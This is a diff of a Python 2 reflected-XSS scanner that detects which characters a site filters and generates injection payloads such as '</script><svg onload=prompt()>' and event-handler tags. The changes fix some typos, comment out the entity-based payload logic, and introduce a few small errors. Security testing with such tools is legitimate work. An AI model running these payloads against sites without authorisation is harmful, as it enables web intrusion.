@@ -32,7 +32,7 @@ br.set_handle_referer(True) # Include referrer
 br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
 ('Accept-Encoding', 'deflate'), ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')]
 
-date = '04-03-2018'
+date = '04-03-2018x'
 
 def update():
     print '%s Checking for updates...' % run
@@ -236,7 +236,7 @@ def filter_checker(url, param_data, GET, POST):
             else:
                 medium_request = br.open(url + medium_string).read()
             if '<zz onxx=yy>' in medium_request:
-                print '%s Filter Strength : %sMedium%s' % (info, yellow. end)
+                print '%s Filter Strength : %sMedium%s' % (info, yellow, end)
                 strength = 'medium'
             else: #Printing high since result was not medium/low
                 print '%s Filter Strength : %sHigh%s' % (bad, red, end)
@@ -479,7 +479,7 @@ def inject(url, param_data, GET, POST):
             allowed.append('"')
         elif test_param_check('k"k', 'k&quot;k', OCCURENCE_NUM, url, param_data, GET, POST, action='nope'):
             print '%s Double Quotes (") are not allowed.' % bad
-            print '%s HTML Encoding detected i.e " --> &quot;' % bad
+            print '%s HTML Encoding detected i.e " --> &quote;' % bad
             HTML_encoding = True
         else:
             print '%s Double Quotes (") are not allowed.' % bad
@@ -501,13 +501,13 @@ def inject(url, param_data, GET, POST):
             angular_allowed = False
             print '%s Angular Brackets (<>) are not allowed.' % bad
         
-        if test_param_check('k&gt;k', 'k&gt;k', OCCURENCE_NUM, url, param_data, GET, POST, action='nope') or test_param_check('&gt;', '>', OCCURENCE_NUM, url, param_data, GET, POST, action='nope'):
-            entity_allowed = True
-            allowed.append('entity')
-            print '%s HTML Entities are allowed.' % good
-        else:
-            entity_allowed = False
-            print '%s HTML Entities are  not allowed.' % bad
+        # if test_param_check('k&gt;k', 'k&gt;k', OCCURENCE_NUM, url, param_data, GET, POST, action='nope') or test_param_check('&gt;', '>', OCCURENCE_NUM, url, param_data, GET, POST, action='nope'):
+        #     entity_allowed = True
+        #     allowed.append('entity')
+        #     print '%s HTML Entities are allowed.' % good
+        # else:
+        #     entity_allowed = False
+        #     print '%s HTML Entities are  not allowed.' % bad
         
         if location == 'comment':
             print '%s Trying to break out of %sHTML Comment%s context.' % (run, green, end)
@@ -530,16 +530,17 @@ def inject(url, param_data, GET, POST):
         
         elif location == 'script':
             print '%s Trying to break out of %sJavaScript%s context.' % (run, green, end)
-            prefix_suffix = {'\'-': '-\'', '\\\'-': '-\\\'', '\\\'-': '//\''}
+            prefixes = ['\'-', '\\\'-', '\\\'-']
+            suffixes = ['-\'', '-\\\'', '//\'']
             progress = 0
-            for prefix, suffix in prefix_suffix:
+            for prefix, suffix in izip(prefixes, suffixes):
                 for function in functions:
                     progress = progress + 1
                     sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
                     sys.stdout.flush()
                     payload = prefix + function + suffix
                     test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
-            test_param_check(quote_plus('</script><svg onload=prompt()>'), '</script><svg onload=prompt()>', OCCURENCE_NUM, url. param_data, GET, POST, action='do')
+            test_param_check(quote_plus('</script><svg onload=prompt()>'), '</script><svg onload=prompt()>', OCCURENCE_NUM, url, param_data, GET, POST, action='do')
         
         elif location == 'html_data':
             print '%s Trying to break out of %sPlaintext%s context.' % (run, green, end)
@@ -547,8 +548,8 @@ def inject(url, param_data, GET, POST):
             l_than, g_than = '', ''
             if angular_allowed:
                 l_than, g_than = '<', '>'
-            elif entity_allowed:
-                l_than, g_than = '&lt;', '&gt;'
+            # elif entity_allowed:
+            #     l_than, g_than = '&lt;', '&gt;'
             else:
                 print '%s Angular brackets are being filtered. Unable to generate payloads.' % bad
                 continue
@@ -570,7 +571,7 @@ def inject(url, param_data, GET, POST):
             quote = which_quote(OCCURENCE_NUM, url, param_data, GET, POST)
             
             if quote == '':
-                prefix = ['/>']
+                prefix = '/>'
                 suffixes = ['<"', '<\'', '<br attr\'=', '<br attr="']
             
             elif quote in allowed:
@@ -593,26 +594,26 @@ def inject(url, param_data, GET, POST):
             
             elif quote not in allowed and 'entity' in allowed:
                 prefix = ''
-                if quote == '\'':
-                    prefix = '&apos;'
-                    suffixes = ['&lt;&apos;', '&lt; attr=&apos;']
-                elif quote == '"':
-                    prefix = '&quote'
-                    suffixes = ['&lt;&quote', '&lt;br attr=&quote']
-                for suffix in suffixes:
-                    progress = 0
-                    for tag in tags:
-                        for event_handler, compatible in event_handlers.items():
-                            if tag in compatible:
-                                for filling, function, e_filling in izip(fillings, functions, e_fillings):
-                                    progress = progress + 1
-                                    sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
-                                    sys.stdout.flush()
-                                    if event_handler == 'oNeRror':
-                                        payload = '%s%s%s%s%s%s%s%s%s=%s%s%s%s' % (prefix, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, suffix)
-                                    else:
-                                        payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
-                                    test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
+                # if quote == '\'':
+                #     prefix = ['&apos;', '&apos;']
+                #     suffixes = ['&lt;&apos;', '&lt; attr=&apos;']
+                # elif quote == '"':
+                #     prefix = ['&quote;', '&quote;']
+                #     suffixes = ['&lt;&quote;', '&lt;br attr=&quote;']
+                # for suffix in suffixes:
+                #     progress = 0
+                #     for tag in tags:
+                #         for event_handler, compatible in event_handlers.items():
+                #             if tag in compatible:
+                #                 for filling, function, e_filling in izip(fillings, functions, e_fillings):
+                #                     progress = progress + 1
+                #                     sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
+                #                     sys.stdout.flush()
+                #                     if event_handler == 'oNeRror':
+                #                         payload = '%s%s%s%s%s%s%s%s%s=%s%s%s%s' % (prefix, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, suffix)
+                #                     else:
+                #                         payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
+                #                     test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
             else:
                 print '%s Quotes are being filtered, its not possible to break out of the context.' % bad
 
